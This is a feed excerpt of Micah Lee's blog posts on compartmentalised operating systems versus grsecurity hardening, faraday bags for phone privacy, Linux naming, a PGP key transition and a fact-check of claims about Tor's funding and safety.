&lt;p&gt;In Qubes, you separate your computer into different security domains (also known as AppVMs), but in each of these domains you’re basically running a normal, non-hardened OS. If an attacker hacks you, they only have access to data in a single security domain, and the rest of your data remains safe. In Debian/grsec — like in every non-Qubes operating system that’s currently available, including Windows, Mac OS X, Ubuntu, Arch, etc. — you only have one security domain, so if an attacker hacks you it’s basically game over. But grsec makes it harder for an attacker to successfully hack you. (I’m looking forward to the release &lt;a href="https://subgraph.com/sgos/"&gt;Subgraph OS&lt;/a&gt;, which will be the second desktop operating system designed for compartmentalization, and which will be based on Debian, grsec, and Linux containers.)&lt;/p&gt;
&lt;p&gt;For example, let’s say an attacker sends you a malicious PDF that secretly exploits a bug in Evince, a popular Linux PDF viewer. Pretend you’re running Qubes and decide to open this PDF in your “personal” security domain that you use for non-work related stuff (really you should open it in a disposable VM, but maybe you didn’t think it was that risky or something). The PDF exploits the bug in Evince and jumps into the attacker’s shellcode, and now the attacker can run whatever commands they want and access any of your data, but only within your “personal” AppVM. They can’t access any of the files in your “work” domain, or your “email” domain, or the networkless “vault” domain that you use to store your PGP secret keys and password databases.&lt;/p&gt;
&lt;p&gt;Now pretend you’re running Debian/grsec. You open the PDF, it exploits the bug in Evince and tries to jump to the attacker’s shellcode, but grsec detects that your Evince process is trying to execute code in an off-limits part of memory and kills the process. Evince immediately closes, grsec logs an error to syslog, and you don’t get hacked at all. In this case, grsec completely prevented the attack, while Qubes only contained it.&lt;/p&gt;
&lt;p&gt;But now let’s change the example. Instead of Evince, the attacker is exploiting a bug in Iceweasel. If you’re using Qubes, the attacker only hacks the domain that you’re running Iceweasel in. If you’re using Debian/grsec (and you disabled &lt;code&gt;MPROTECT&lt;/code&gt; on &lt;code&gt;/usr/lib/iceweasel/iceweasel&lt;/code&gt; like we did above), the attacker’s shellcode will run and they’ll have access to all of your files, be able to log your keystrokes, etc. They might have a very difficult time getting root, which will make it harder for them to install a persistent backdoor, but that’s little consolation.&lt;/p&gt;
&lt;p&gt;Hardening your kernel with grsecurity is great because it makes it much harder for attacks against you to succeed, but it still doesn’t make it so you can compartmentalize your computer the way that Qubes does. It’s also important to remember that grsec mostly protects you against memory corruption bugs, but other types of security issues exist too. You might run an ssh server and use a crappy password. You might get tricked into copying and pasting something malicious into your terminal. You might be running buggy software that can be exploited without jumping into forbidden memory space, so grsec won’t catch it.&lt;/p&gt;
&lt;p&gt;There’s another big difference between Qubes and Debian/grsec: Usability.&lt;/p&gt;
&lt;p&gt;Qubes isn’t terribly hard to use (for experienced Linux nerds), but it does require shifting the paradigm about how you think about operating systems, and working around software that isn’t designed for it. For example, it’s not uncommon to have four or five different web browsers open at the same time, all running in different security domains for different purposes. If someone sends you a link, you can’t just click it. You have to decide which domain you’d like to open it in first, and then copy it into that domain’s clipboard before pasting it into a browser. There’s also still a lot of work to be done to make USB devices usable in Qubes. If you want to do some Android development, it’s not the simplest task yet to get Android Studio installed and communicating with your phone over a USB port in an AppVM. Same with video chat. And same with figuring out a workflow to take a screenshot, crop it, and then tweet it. Many tasks are complicated in Qubes simply because you have to deal with compartmentalization and the limitations of virtualizing all of your software — but this is also what gives Qubes its strength.&lt;/p&gt;
&lt;p&gt;Debian with grsec doesn’t require this paradigm shift. Once you get past the initial PaX learning curve and make sure that the software you use most often all works, then it’s just like using any other operating system — but you get the invisible-but-awesome benefits of having a hardened kernel. USB devices, webcams, screenshots, and everything else work just like you’re used to. So if you’re not quite ready for Qubes, or if you can’t run Qubes for your specific work for whatever reason, Debian/grsec might be a good choice for you.&lt;/p&gt;
&lt;p&gt;The best of both worlds would be running Qubes, but with AppVMs that have grsecurity-patched Linux kernels. This is entirely possible, but no one has yet succeeded in doing it.&lt;/p&gt;
</content></entry><entry><title>Some Thoughts on Faraday Bags and Operational Security</title><link href="https://micahflee.com/2015/11/some-thoughts-on-faraday-bags-and-operational-security/" rel="alternate"></link><updated>2015-11-25T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:cc7372f2-3a47-3fe7-b719-a400800b83fe</id><content type="html">&lt;p&gt;I recently took a trip to Moscow to &lt;a href="https://theintercept.com/2015/11/12/edward-snowden-explains-how-to-reclaim-your-privacy/"&gt;interview National Security Agency whistblower Edward Snowden&lt;/a&gt; about operational security. In the article I published on The Intercept, I mentioned that I used a faraday bag.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Our first meeting would be in the hotel lobby, and I arrived with all my important electronic gear in tow. I had powered down my smartphone and placed it in a “faraday bag” designed to block all radio emissions.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since I published my interview, many people have asked me for more information about this faraday bag — which product did I get, what does it protect against, how does it work? So here are some quick thoughts on the topic.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What are faraday bags?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Faraday bags, or more generally, &lt;a href="https://en.wikipedia.org/wiki/Faraday_cage"&gt;faraday cages&lt;/a&gt;, are named after the brilliant scientist Michael Faraday. If you’re a nerd, I recommend watching the &lt;a href="https://en.wikipedia.org/wiki/The_Electric_Boy"&gt;10th episode&lt;/a&gt; of Neil DeGrasse Tyson’s Cosmos to learn more about him.&lt;/p&gt;
&lt;p&gt;They’re made of a material that blocks electric fields from passing through it. Smartphones have a ton of different built-in radios: GSM, CDMA, 2G, 3G, 4G, wifi, bluetooth, NFC, GPS, and others. Each of these communicates wirelessly by sending and receiving information through the air in the form of radio emissions on different frequencies. If you put your smartphone inside of a faraday bag, it might be listening for incoming radio emissions, but none will reach it, and it might be attempting to communicate to the outside, but all of its messages will fail to penetrate the bag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Which one should I buy?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I bought my faraday bag on Amazon. I didn’t have a particular product in mind; I basically just read reviews and got a nice one that was a little on the bigger side so that I could fit multiple phones, and also my passport (which has an RFID chip, which also communicates using radio emissions).&lt;/p&gt;
&lt;p&gt;It doesn’t particularly matter which product you choose, but make sure that you test it after you get it to confirm that it works. Testing it is easy enough. Put your phone inside the bag, and then use another phone to try calling it. If your phone rings, it doesn’t work. You can also test data in a similar fashion — try sending yourself a notification over data (like a Facebook message) and see if your phone receives it while it’s inside the bag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Why might this be useful for operational security?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, assume that your smartphone is hacked and that the attacker can utilize all of its radios and sensors. Also assume that your attacker can get information from third party companies, such as your cell phone carrier, which will know your location and be in a position to eavesdrop on much of your phone usage.&lt;/p&gt;
&lt;p&gt;Smartphones are crazy useful, so it sucks to not use them just because you can’t trust them. Instead, you can use faraday bags to &lt;em&gt;selectively keep certain information away from your phone&lt;/em&gt;, despite the fact that you can’t trust it.&lt;/p&gt;
&lt;p&gt;If you carry your phone around with you, your attacker gets to learn your location. From when you turn on your phone after your airplane lands, to taking public transit or a taxi to your hotel, to going out for dinner or drinks, or anything else — the attacker can see your exact location.&lt;/p&gt;
&lt;p&gt;So if you want to have a meeting without revealing to your attacker where this meeting is taking place (your attacker can likely infer who you’re meeting with based on what other phones are in the same location), but you don’t want to leave your phone in your hotel room, you can safely bring it with you inside a faraday bag, because your phone itself won’t be able to determine its location. It may try to, but those signals won’t penetrate the material of the bag.&lt;/p&gt;
&lt;p&gt;Your phone might be spying on you in other ways, too. It has a microphone, so it could be listening to your conversations and streaming them back to your attacker over the internet, or using some other wireless technology like wifi or bluetooth. Keeping your phone in a faraday bag will prevent your phone from communicating at all.&lt;/p&gt;
&lt;p&gt;But here’s an important caveat: Your phone could be listening to your conversations and storing them on disk, waiting for an internet connection. As soon as you take your phone out of your faraday bag, it can use the internet to upload recorded audio to your attacker.&lt;/p&gt;
&lt;p&gt;Faraday bags block electric fields, but they don’t block sound. If you don’t want your phone to overhear a conversation, just putting it in a faraday bag isn’t enough. You also need to put it out of earshot. Put it in a different room, muffle it under some pillows, or put it in the refrigerator.&lt;/p&gt;
</content></entry><entry><title>Why I say Linux instead of GNU/Linux</title><link href="https://micahflee.com/2015/09/why-i-say-linux-instead-of-gnulinux/" rel="alternate"></link><updated>2015-09-18T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:2bec3a46-4c0a-3757-ac9e-07abb107524c</id><content type="html">&lt;p&gt;I’ve been writing a &lt;a href="https://theintercept.com/staff/micah-lee/"&gt;computer security column&lt;/a&gt; for the Intercept. In most of my columns I mention Linux. Even when it’s not directly relevant (though it often is), most of my columns are in the form of tutorials, and I’d like my tutorials to be equally useful for Linux users as they are for Windows and Mac users.&lt;/p&gt;
&lt;p&gt;For one thing, I love free and open source software. These projects are critical for security, privacy, and for the ability to tinker with and learn about your own computer. As the number of people who run free (as in speech) operating systems rise, so will the development resources that get poured into those operating systems until they “just work” at least as well as Windows and OS X do, so I talk about them every chance I get. Many of my readers already run free operating systems, and I would hate to leave them out.&lt;/p&gt;
&lt;p&gt;After writing a column about how to &lt;a href="https://theintercept.com/2015/07/14/communicating-secret-watched/"&gt;communicate in secret while we’re all being watched&lt;/a&gt;, I got an email from Richard Stallman saying when I say Linux I clearly mean the GNU system, and he asked that I start referring to Linux distributions as GNU/Linux “so as to give us equal mention when you talk about our work.” And after writing my most recent column about how &lt;a href="https://theintercept.com/2015/09/16/getting-hacked-doesnt-bad/"&gt;VMs can be used for isolation security&lt;/a&gt;, Stallman wrote a &lt;a href="https://theintercept.com/2015/09/16/getting-hacked-doesnt-bad/?comments=1#comment-164975"&gt;comment&lt;/a&gt; again saying that I mean “GNU and Linux” and asking that I give GNU equal mention. This is a really common point of view (though not at all a consensus) in the free software community, and one that I shared for a long time. But I’ve come to change my mind.&lt;/p&gt;
&lt;p&gt;When I talk about Linux, I’m not talking about the GNU system. I’m also not talking about a kernel. Twenty years ago GNU/Linux really was mostly the GNU system plus the Linux kernel, because GNU didn’t have its own kernel. But today when I say Linux I’m talking about something else entirely. I’m referring about the type of open source operating systems that are typically composed of the Linux kernal plus a plethora of userland projects. These usually include some of the &lt;a href="https://www.gnu.org/software/"&gt;GNU system projects&lt;/a&gt;, but they also include (pre-installed or in repositories) thousands of other open source projects, like desktop environments, web browsers, office software, programming languages, libraries and tools, hypervisors, server software, games, and so on and so forth.&lt;/p&gt;
&lt;p&gt;“GNU/Linux” doesn’t accurately describe this type of operating system at all. A whole lot has changed since the GNU system was first developed. Of course, “Linux” doesn’t accurately describe it either, so why do I use that term?&lt;/p&gt;
&lt;p&gt;Because that’s what the term means. The &lt;a href="http://dictionary.reference.com/browse/linux?s=t"&gt;definition&lt;/a&gt; of Linux (according to dictionary.com, though other dictionaries have similar definitions) is: “an operating system, based on UNIX, that runs on many different hardware platforms and whose source code is available to the public.” The origin of the term Linux comes from the kernel, but the colloquial definition – what normal people think when they hear and say Linux (assuming they’ve heard of it at all) – is an open source operating system. I would guess that most people who have heard of Linux, and have a general idea of what it is, have no idea what a kernel is.&lt;/p&gt;
&lt;p&gt;Unfortunately for Stallman, language evolves naturally, and trying to force changes in language doesn’t always work out. If you’re looking at language &lt;a href="https://en.wikipedia.org/wiki/Linguistic_description"&gt;descripively&lt;/a&gt; instead of &lt;a href="https://en.wikipedia.org/wiki/Linguistic_prescription"&gt;prescriptively&lt;/a&gt;, Linux, not GNU/Linux, is the term that people use most of the time when referring to a Linux distribution, so that’s what that term means.&lt;/p&gt;
&lt;p&gt;And I don’t mean to say that everyone should stop saying GNU/Linux in favor of Linux. The choice is yours. I’m just explaining my reasoning behind it.&lt;/p&gt;
&lt;p&gt;And while I’m at it, I thought I’d explain why I use the term PGP instead of GPG. I used to only refer to PGP keys as “GPG keys” and I didn’t like using the term PGP at all because there’s a proprietary encryption product (that no one uses, and no one should use) that &lt;a href="https://en.wikipedia.org/wiki/PGP_Corporation"&gt;used to go by the name&lt;/a&gt;. But then, as I learned more, I realized that PGP is simply a more accurate term.&lt;/p&gt;
&lt;p&gt;GPG is short of &lt;a href="https://gnupg.org/"&gt;GnuPG&lt;/a&gt;, a free software encryption program that complies with &lt;a href="https://tools.ietf.org/html/rfc4880"&gt;RFC-4880&lt;/a&gt;, which is the current technical spec that describes the &lt;a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy#OpenPGP"&gt;OpenPGP&lt;/a&gt; message format. When I use the term PGP, as in, “&lt;a href="https://micahflee.com/pgp.asc"&gt;Here&lt;/a&gt; is a copy of my PGP key,” it’s short for OpenPGP, and has nothing at all to do with the proprietary program. Many different projects comply with the OpenPGP spec, like Google’s &lt;a href="https://github.com/google/end-to-end"&gt;End-to-End&lt;/a&gt;, &lt;a href="http://openpgpjs.org/"&gt;OpenPGP.js&lt;/a&gt;, and &lt;a href="https://pypi.python.org/pypi/pgpdump"&gt;pgpdump&lt;/a&gt;, to name a few – and none of these share code with GPG.&lt;/p&gt;
&lt;p&gt;But, most importantly, I use the terms Linux and PGP instead of GNU/Linux and GPG because that’s how people colloqually speak about these technologies. Technology is already confusing enough, and despite how cool recursive acronyms are, insisting that everyone use one piece of jargon over another piece of jargon doesn’t do anything to help people who are new at it learn and tinker.&lt;/p&gt;
</content></entry><entry><title>Transitioning PGP keys</title><link href="https://micahflee.com/2015/08/transitioning-pgp-keys/" rel="alternate"></link><updated>2015-08-17T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:67b4ded6-3f6c-31cf-b03c-2d49b484dd59</id><content type="html">&lt;p&gt;I’m switching from my old key:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub   4096R/EBA34B1C 2014-05-08 [expires: 2016-05-05]
      Key fingerprint = 0B14 9192 9806 5962 5470  0155 FD72 0AD9 EBA3 4B1C
uid                  Micah Lee &amp;lt;micah@micahflee.com&amp;gt;
uid                  Micah Lee &amp;lt;micah@firstlook.org&amp;gt;
uid                  Micah Lee &amp;lt;micah.lee@firstlook.org&amp;gt;
uid                  Micah Lee &amp;lt;micah.lee@theintercept.com&amp;gt;
uid                  Micah Lee &amp;lt;micah@pressfreedomfoundation.org&amp;gt;
uid                  Micah Lee &amp;lt;micah@freedom.press&amp;gt;
sub   4096R/64B1D8D1 2014-05-08 [expires: 2016-05-05]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;to the following key:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub   4096R/CD994F73 2015-08-14 [expires: 2016-08-13]
      Key fingerprint = 927F 419D 7EC8 2C2F 149C  1BD1 403C 2657 CD99 4F73
uid                  Micah Lee &amp;lt;micah@micahflee.com&amp;gt;
uid                  Micah Lee &amp;lt;micah@freedom.press&amp;gt;
uid                  Micah Lee &amp;lt;micah.lee@theintercept.com&amp;gt;
uid                  Micah Lee &amp;lt;micah@firstlook.org&amp;gt;
sub   4096R/5D5F1356 2015-08-14 [expires: 2016-08-13]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here’s a copy of my &lt;a href="https://micahflee.com/gpg.asc"&gt;new public key&lt;/a&gt;, and here’s a &lt;a href="https://micahflee.com/wp-content/uploads/2015/08/key-transition-2015-08-17.txt.asc"&gt;key transition statement&lt;/a&gt; that I signed with my old key.&lt;/p&gt;
</content></entry><entry><title>Fact-checking Pando’s smears against Tor</title><link href="https://micahflee.com/2014/12/fact-checking-pandos-smears-against-tor/" rel="alternate"></link><updated>2014-12-11T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:ef97ac20-f9d6-3b31-b2e4-66513ed349d2</id><content type="html">&lt;p&gt;If you’ve been able to ignore Pando Daily’s 100% non-technical smear campaign against the Tor Project and its developers and supporters, you’re lucky, and you may wish to stop reading now. Otherwise, read on, and perhaps prepare to lose a few brain cells.&lt;/p&gt;
&lt;p&gt;Yasha Levine’s “&lt;a href="http://pando.com/2014/07/16/tor-spooks/"&gt;investigation&lt;/a&gt;” against Tor unveiled what’s already prominently displayed on Tor’s website: that it was designed by the Navy and that it receives a lot of federal funding, the bulk of which comes from the Department of Defense.&lt;/p&gt;
&lt;p&gt;To be clear, talking about Tor’s government funding is a very important discussion to have. But Yasha didn’t discuss potential threats to Tor users’ anonymity that this funding might cause, nor what potential solutions would be. Instead, he implied that there’s some sort of conspiracy between Tor developers and the US government, and that the Tor network cannot be trusted, apparently oblivious that the decentralized and open nature of the Tor network and it’s codebase makes planting backdoors nearly impossible.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Trolling, harassment, and spreading conspiracy theories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Using only the fact that Tor receives federal funding, Pando has managed to rile up an anti-Tor community of Twitter trolls who insist that blatantly false things are true, like: using Tor makes it &lt;em&gt;easier&lt;/em&gt; for the government to track you, that Tor is a honeytrap, that Tor developers are anti-privacy and support NSA spying, and that you can tell everything about a woman because she dyes her hair.&lt;/p&gt;
&lt;p&gt;They also borrow tactics from GamerGate, including making puppet Twitter accounts to &lt;a href="http://charon.persephoneslair.org/~andrea/pandorasts/jeremy_becker/"&gt;harrass women&lt;/a&gt;, and to continue harassing people when they get blocked. They even started using the GamerGate-copycat hashtag #TorGate, not realizing that it kinda reinforces the sexist troll image they’re trying to deny.&lt;/p&gt;
&lt;p&gt;&lt;img src="torgate.png" alt="#TorGate"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Government funding might be the first step in exposing a scandal, but not the only step&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Throughout all of this, the Pando people (Yasha Levine, Paul Carr, and Mark Ames) and their #TorGate followers haven’t presented a shred of technical evidence against Tor’s safety. Their concerns are 100% speculation. They make the government funding point (an easy point to make since Tor prominently lists their &lt;a href="https://www.torproject.org/about/sponsors.html.en"&gt;sponsors&lt;/a&gt; and publishes &lt;a href="https://www.torproject.org/about/financials.html.en"&gt;financial reports&lt;/a&gt; for the sake of transparency), but then fail to connect any dots.&lt;/p&gt;
&lt;p&gt;This is important because if they could present an actual specific concern, we can verify if their concern is real or not. The code is open, and anyone (including you) can easily run and study your own Tor nodes to confirm your suspicions.&lt;/p&gt;
&lt;p&gt;Security issues with Tor get discovered all the time, and each time they get thoroughly researched (someone often ends up publishing a paper), the codebase gets patched, and Tor blogs about it to inform the public what the problem was and how it was fixed. See some recent examples &lt;a href="https://blog.torproject.org/blog/what-spoiled-onions-paper-means-tor-users"&gt;here&lt;/a&gt;, &lt;a href="https://blog.torproject.org/blog/thoughts-and-concerns-about-operation-onymous"&gt;here&lt;/a&gt;, &lt;a href="https://blog.torproject.org/blog/advisory-remote-dos-when-using-tor-recent-openssl-versions-built-no-ssl3-option"&gt;here&lt;/a&gt;, &lt;a href="https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack"&gt;here&lt;/a&gt;, &lt;a href="https://blog.torproject.org/blog/isec-partners-conducts-tor-browser-hardening-study"&gt;here&lt;/a&gt;, and &lt;a href="https://blog.torproject.org/blog/quick-summary-recent-traffic-correlation-using-netflows"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The #TorGate people don’t know of any problems that exist with Tor or they would articulate what they are. They’re not interested in fixing problems to make Tor safer for everyone, they’re only interested in spreading conspiracies about Tor being run by the Feds as a honeytrap to spy on activists. These accusations are quite serious considering that activists around the world literally rely on Tor for their lives. Fortunately, they’re complete nonsense.&lt;/p&gt;
&lt;p&gt;When I &lt;a href="https://twitter.com/micahflee/status/538147229228232704"&gt;asked Yasha on Twitter&lt;/a&gt; how he would fix Tor to make it trustworthy and safe for everyone to use, the best he could come up with is to post prominent warnings on Tor’s website that says “USE AT OWN RISK” because it receives DoD grants. Keep in mind that potential answers could be: fork the project (it’s open source, after all) and build a separate onion routing network that doesn’t receive government funding; stop applying for government grants in favor of other sources of funding; etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Fact checking Pando’s Tor smear&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the faux-exposé that started all of this, “&lt;a href="http://pando.com/2014/07/16/tor-spooks/"&gt;Almost everyone involved in developing Tor was (or is) funded by the US government&lt;/a&gt;”, Yasha writes:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Let’s start with the basics: Tor was developed, built and financed by the US military-surveillance complex. Tor’s original — and current — purpose is to cloak the online identity of government agents and informants while they are in the field: gathering intelligence, setting up sting operations, giving human intelligence assets a way to report back to their handlers — that kind of thing. This information is out there, but it’s not very well known, and it’s certainly not emphasized by those who promote it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Cloaking the online identity of government agents and informants is likely the reason that the DoD helps fund Tor—they depend on it as much as everyone else—but this is not the purpose of Tor.&lt;/p&gt;
&lt;p&gt;The purpose of Tor is to let anybody—normal internet users, businesses with trade secrets, activists, journalists and their sources, police, and yes, the military—have an anonymous connection to the net. If an onion routing network has any hope of hiding who is using it, it needs a diversity of users, all of whom receive equal benefits of anonymity.&lt;/p&gt;
&lt;p&gt;This paper by Acquisti, Dingledine, and Syverson, &lt;a href="http://freehaven.net/doc/fc03/econymics.pdf"&gt;On the Economics of Anonymity&lt;/a&gt;, goes into much greater detail, but here’s a quote from it that accurately describes the true purpose of Tor:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Single-hop web proxies like the Anonymizer protect end users from simple threats like profile-creating websites. On the other hand, users of such commercial proxies are forced to trust them to protect traffic information. Many users, particularly large organizations, are rightly hesitant to use an anonymity infrastructure they do not control. However, on an open network such as the Internet, running one’s own system won’t work: a system that carries traffic for only one organization will not hide the traffic entering and leaving that organization. Nodes must carry traffic from others to provide cover. The only viable solution is to distribute trust. That is, each party can choose to run a node in a shared infrastructure, if its incentives are large enough to support the associated costs. Users with more modest budgets or shorter-term interest in the system also benefit from this decentralized model, because they can be confident that a few colluding nodes are unlikely to uncover their anonymity.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In short, the diversity of users is what makes Tor work. If Tor were only built for US spies to use then anyone who sees a Tor user visit their website knows that the spies must be interested in them. Because Tor has millions of diverse users, if you see a Tor user visit your website all you know is that they’re using Tor. They could be a spy, but they could also be an activist, a hacker, or just someone who doesn’t want ad networks tracking them as they browse the web. You simply don’t know, and that’s what makes it work. Here’s an excellent overview of the diverse communities of people that benefit equally from Tor.&lt;/p&gt;
&lt;p&gt;Yasha claims that: “This information is out there, but it’s not very well known, and it’s certainly not emphasized by those who promote it.” Here’s a screenshot from the front-page of Tor’s website. Notice the “Military &amp;amp; Law Enforcement” section.&lt;/p&gt;
&lt;p&gt;&lt;img src="who-uses-tor.png" alt="Who Uses Tor"&gt;&lt;/p&gt;
&lt;p&gt;Check out the prominent &lt;a href="https://www.torproject.org/about/overview.html.en"&gt;Tor overview page&lt;/a&gt; which begins:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Tor was originally designed, implemented, and deployed as a third-generation &lt;a href="http://www.onion-router.net/"&gt;onion routing project of the U.S. Naval Research Laboratory&lt;/a&gt;. It was originally developed with the U.S. Navy in mind, for the primary purpose of protecting government communications. Today, it is used every day for a wide variety of purposes by normal people, the military, journalists, law enforcement officers, activists, and many others.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The Tor Project has always been completely honest about their origin and funding. In fact, the non-profit goes further to be &lt;a href="https://blog.torproject.org/blog/transparency-openness-and-our-2013-financials"&gt;transparent about everything it does&lt;/a&gt;, including funding, than any other organization that I know about. If you can find any organization that is as transparent as the Tor Project, please post about it in the comments. I’m curious if one exists.&lt;/p&gt;
&lt;p&gt;Continuing on with Yasha’s hit piece, he goes on to cherry-pick the military and police uses of Tor, ignoring the &lt;a href="https://www.torproject.org/about/torusers.html.en"&gt;rest of the users&lt;/a&gt;, and then sets the stage for conspiracy nonsense:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;NSA? DoD? U.S. Navy? Police surveillance? What the hell is going on? How is it possible that a privacy tool was created by the same military and intelligence agencies that it’s supposed to guard us against? Is it a ruse? A sham? A honeytrap? Maybe I’m just being too paranoid…&lt;/p&gt;
&lt;p&gt;Unfortunately, this is not a tinfoil hat conspiracy theory. It is cold hard fact.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then Yasha goes on to explain the history of Tor, it’s military origins, how the project was open sourced and handed to EFF to manage. He quotes a 2004 EFF press release about Tor and accuses them of failing to mention that “this anonymity tool was developed primarily for military and intelligence use.” He criticizes them for focusing on its ability to protect free speech from oppressive regimes. EFF focused on this because &lt;em&gt;Tor can help protect free speech from oppressive regimes&lt;/em&gt;. EFF is an non-profit law firm that’s devoted to upholding constitutional rights online. Just as the Navy supports Tor because they can use it to communicate securely, EFF supports Tor because it’s &lt;em&gt;a vital tool for free speech and censorship circumvention&lt;/em&gt;. Yasha seems to be pretending that ordinary people’s privacy isn’t protected when they use Tor, which is a lie.&lt;/p&gt;
&lt;p&gt;Tor is a tide that lifts all boats. When Tor was open sourced, it was no longer “developed primarily for military and intelligence use.” It was opened up under a &lt;a href="https://www.torproject.org/docs/faq.html.en#DistributingTor"&gt;free software license&lt;/a&gt; and given to all internet users, in all their diversity, who have owned it and relied on it ever since. It’s used by government agents, police investigating drug dealers, drug dealers trying not to get caught by police, investigative journalists, whistleblowers, and private citizens trying to browse the web privately.&lt;/p&gt;
&lt;p&gt;In the end Tor does one thing: it keeps people’s IP addresses anonymous while they use the internet. This is why everyone with a vested interest in online anonymity, including the DoD (to keep their agents safe), and EFF (who’s currently suing the NSA for illegal spying), supports Tor.&lt;/p&gt;
&lt;p&gt;Yasha goes on to outline Tor’s funding sources, much of them from either the DoD or the State Department.&lt;/p&gt;
&lt;p&gt;I’d like to take a moment to point out that Tor’s funding model has some big problems. It’s dangerous to be too reliant on a single entity for funding—if their federal funding is cut, Tor is in trouble. And of course funders might try to influence the direction of the project and the research. In Tor’s case this is mitigated by the fact that 100% of the scientific research and source code that Tor releases is open, that the crypto math is peer-reviewed and backed up by the &lt;a href="https://micahflee.com/2014/06/the-universe-believes-in-encryption/"&gt;laws of physics&lt;/a&gt;, and by the fact that the Tor Project itself doesn’t run the network—the network is diverse and decentralized, run by volunteers all over the world (me included). It would be excellent if there were a way for Tor to get weaned off DoD funding and replace the bulk of it with some other source. And I’m sure they would be interested in doing this, if other sources of money made themselves available.&lt;/p&gt;
&lt;p&gt;Personally I prefer that Tor gets the funding it needs to continue its groundbreaking anonymity research and to continue to improve its product and the stability of its network. I rely on it on a daily basis to do my work in journalism and source protection safely and securely. It would be great to have a real conversation about this without Pando’s baseless conspiracy theories.&lt;/p&gt;
&lt;p&gt;In the section “How safe is Tor, really?”, Yasha points out that traffic correlation attacks exist, and that Tor isn’t safe against global adversaries (which are both likely-unsolvable low-latency onion routing problems that have been outlined in Tor’s &lt;a href="https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf"&gt;design document&lt;/a&gt; since at least 2004). Tor has done more research on these issues than anyone else, and the latest version of Tor is the state-of-the-art technology in this area, but it will probably never be perfect, because it’s probably not possible for it to be perfect.&lt;/p&gt;
&lt;p&gt;In his hit piece, Yasha lists some examples of Tor failing to protect people:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Harvard kid who was the only Tor user on Harvard’s network at the time that he sent his bomb threat.&lt;/li&gt;
&lt;li&gt;The Freedom Hosting and Silk Road hacks (problems with the web apps that were hosted as Tor hidden services, not with Tor itself).&lt;/li&gt;
&lt;li&gt;Exit node sniffing (an issue with people using plaintext protocols on the internet; people are just as vulnerable when using airport wifi, though perhaps they’re less likely to have an attacker on their network than to be using a malicious exit node).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These sort of things happen a lot, and they will continue to happen a lot. Like plane crashes, we can study and learn from them each time to make them less likely to happen in the future. Tor continues to improve, and to make these attacks harder, more expensive, or impossible to pull off.&lt;/p&gt;
&lt;p&gt;For example, when FBI hacked Freedom Hosting servers and started attacking visitors’ Tor Browsers with javascript exploits, they only attacked old versions of Tor Browser (based on an old Firefox exploit) because new versions weren’t vulnerable. The major problem there was that people weren’t upgrading their software. Now Tor Browser doesn’t just warn you when your browser is out-of-date, it will automatically upgrade it for you too. Next time a Freedom Hosting-style attack happens, no one will be running an outdated Tor Browser.&lt;/p&gt;
&lt;p&gt;This doesn’t mean that it’s dangerous to use Tor, especially if you pay attention to the &lt;a href="https://www.torproject.org/download/download-easy.html.en#warning"&gt;list of things to pay attention to&lt;/a&gt; that all Tor users see when they download Tor Browser, and again when they open Tor Browser. It certainly doesn’t mean that Tor is a honeytrap.&lt;/p&gt;
&lt;p&gt;Yasha references Snowden documents (2.5 years old at this point) about NSA’s attempts to attack Tor. Of course, he didn’t mention the slide that confirms that (at least 2.5 years ago) NSA wasn’t a global adversary, and therefore couldn’t easily deanonymize Tor users by connecting the routing dots. We’ve learned a lot about NSA’s almost omnipotent capabilities from the Snowden leaks, and this slide gave me great hope that we still have a fighting chance at privacy.&lt;/p&gt;
&lt;p&gt;&lt;img src="tor-stinks.png" alt="Tor Stinks"&gt;&lt;/p&gt;
&lt;p&gt;He states that: “Tor co-founder Roger Dingledine revealed that the Tor Network is configured to prioritize speed and route traffic through through the fastest servers/nodes available,” as if this were a secret, and Roger weren’t discussing it in order to figure out how to solve the problem of the trade-off between circuit diversity and speed.&lt;/p&gt;
&lt;p&gt;It’s important to know that simply running high bandwidth nodes doesn’t mean you’re malicious. Unless you’re an exit node, 100% of the traffic that travels through your node is encrypted. If you are an exit node, then you can only easily spy on plaintext traffic, e.g. you can see HTTP traffic but you can’t see HTTPS traffic—the same as a normal network attacker on open wifi. And unless you control both the entry and exit nodes in a single circuit (much of the arms race right now is focused on making this impossible), you can’t deanonymize anyone. Tor is built this way by design.&lt;/p&gt;
